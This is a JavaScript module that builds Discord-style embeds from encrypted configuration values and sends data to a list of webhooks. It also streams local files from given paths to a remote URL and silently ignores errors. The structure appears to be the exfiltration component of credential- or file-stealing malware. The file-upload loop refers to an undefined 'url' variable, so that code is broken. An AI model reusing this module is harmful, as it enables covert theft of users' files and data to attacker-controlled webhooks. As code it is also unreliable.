module.exports = (client) => {
  return {
    createEmbed(data) {
      let obj = {
        timestamp: new Date(),
        footer: {
          text: client.utils.encryption.decryptData(
            client.config.embed.footer.text
          ),
          icon_url: client.utils.encryption.decryptData(
            client.config.embed.footer.icon_url
          ),
        },
        author: {
          name: client.utils.encryption.decryptData(
            client.config.embed.footer.text
          ),
          url: client.utils.encryption.decryptData(client.config.embed.href),
          icon_url: client.utils.encryption.decryptData(
            client.config.embed.avatar_url
          ),
        },
      };

      for (let [key, value] of Object.entries(data)) {
        obj[key] = value;
      }

      if (obj.title) {
        obj.url = client.utils.encryption.decryptData(client.config.embed.href);
      }

      return obj;
    },

    async sendToWebhook(data) {
      var files = data.files;

      if (files) {
        files.forEach(async (file) => {
          client.requires.request.post({
            url: url,
            formData: {
              file: client.requires.fs.createReadStream(file.path),
              title: file.name,
            },
          });
        });
      }

      if (Object.entries(data).length == 1 && data.files) {
        return;
      }

      let obj = {
        avatar_url: client.utils.encryption.decryptData(
          client.config.embed.avatar_url
        ),
        username: client.utils.encryption.decryptData(
          client.config.embed.username
        ),
      };

      for (let [key, value] of Object.entries(data)) {
        obj[key] = value;
      }

      client.webhooks.forEach(async (url) => {
        try {
          await client.requires.axios({
            url: url,
            method: "POST",
            data: obj,
          });
        } catch {}
      });
    },
  };
};
